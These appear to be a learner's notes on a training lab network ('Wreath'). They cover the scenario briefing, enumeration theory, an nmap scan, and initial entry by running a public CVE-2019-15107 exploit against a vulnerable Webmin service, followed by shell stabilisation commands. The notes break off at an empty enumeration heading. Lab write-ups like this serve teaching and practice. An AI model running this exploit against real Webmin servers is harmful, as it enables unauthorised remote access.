Thomas has sent over the following information about the network:

---

_There are two machines on my home network that host projects and stuff I'm working on in my own time -- one of them has a webserver that's port forwarded, so that's your way in if you can find a vulnerability! It's serving a website that's pushed to my git server from my own PC for version control, then cloned to the public facing server. See if you can get into these! My own PC is also on that network, but I doubt you'll be able to get into that as it has protections turned on, doesn't run anything vulnerable, and can't be accessed by the public-facing section of the network. Well, I say PC -- it's technically a repurposed server because I had a spare license lying around, but same difference.  


---

From this we can take away the following pieces of information:

- There are three machines on the network
- There is at least one public facing webserver
- There is a self-hosted git server somewhere on the network
- The git server is internal, so Thomas may have pushed sensitive information into it  
- There is a PC running on the network that has antivirus installed, meaning we can hazard a guess that this is likely to be Windows
- By the sounds of it this is likely to be the server variant of Windows, which might work in our favour  
- The (assumed) Windows PC cannot be accessed directly from the webserver

---

There are five possible ways to enumerate a network through a compromised host:

1. Using material found on the machine. The hosts file or ARP cache, for example  
2. Using pre-installed tools  
3. Using statically compiled tools
4. Using scripting techniques
5. Using local tools through a proxy

---

_The difference between a "static" binary and a "dynamic" binary is in the compilation. Most programs use a variety of external libraries (_`.so` _files on Linux, or_ `.dll` _files on Windows) -- these are referred to as "dynamic" programs. Static programs are compiled with these libraries built into the finished executable file. When we're trying to use the binary on a target system we will nearly always need a statically compiled copy of the program, as the system may not have the dependencies installed meaning that a dynamic binary would be unable to run._

---

_**Conduct:**_  
As this network is shared amongst a number of people, it goes without saying: please don't mess things up for others in the network. There are no password changes required in any of these tasks, and no files need deleted. At various stages in this network it will be necessary to upload files and tools to the remote box. Please upload these in the format: `toolname-username` (e.g. `socat-MuirlandOracle`, `shell-MuirlandOracle.aspx`, etc) to avoid overwriting work belonging to anyone else. In short, don't be a troll, be respectful, and have fun!

For tunnelling: **Use ports above 15000**

---

# Initial entry

I'm given an exploit `CVE-2019-15107` an instructed to use it against the public facing web-server: https://github.com/MuirlandOracle/CVE-2019-15107

This gives me initial access to the network.

Firstly though i perform an nmap scan:

```php
# Nmap 7.94SVN scan initiated Fri Jul 19 04:18:22 2024 as: nmap -sC -sV -p 22,80,443,9090,10000 -oN nmap/initial-15000-versions.txt 10.200.57.200
Nmap scan report for 10.200.57.200
Host is up (0.019s latency).

PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
|_  256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
80/tcp    open   http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Did not follow redirect to https://thomaswreath.thm
443/tcp   open   ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Thomas Wreath | Developer
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Not valid before: 2024-07-19T03:08:29
|_Not valid after:  2025-07-19T03:08:29
| tls-alpn: 
|_  http/1.1
9090/tcp  closed zeus-admin
10000/tcp open   http       MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 19 04:19:06 2024 -- 1 IP address (1 host up) scanned in 43.83 seconds
```

`MiniServ 1.890 (Webmin httpd)` is vulnerable to the exploit provided. This is the service i will attack with exploit `CVE-2019-15107`.

```php
./CVE-2019-15107.py 10.200.57.200 -p 10000
```

This gives me a pseudo shell which the exploit then can leverage into a full reverse shell, or i can use my own reverse shell, as described in the briefing.

![[Pasted image 20240720040437.png]]

![[Pasted image 20240720040511.png]]

1. When i get the upgraded shell i firstly stablize it so it's easier to work with

```php
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

2. **CTL+Z**

3. Tell your machine to push the special characters straight to the target so we can use auto-complete etc.

```php
stty raw -echo && fg
```

4. Finally

```php
export TERM=xterm-256-color
```

Now we have a shell we can work with to explore the rest of the network. 

---
# Enumeration after entry

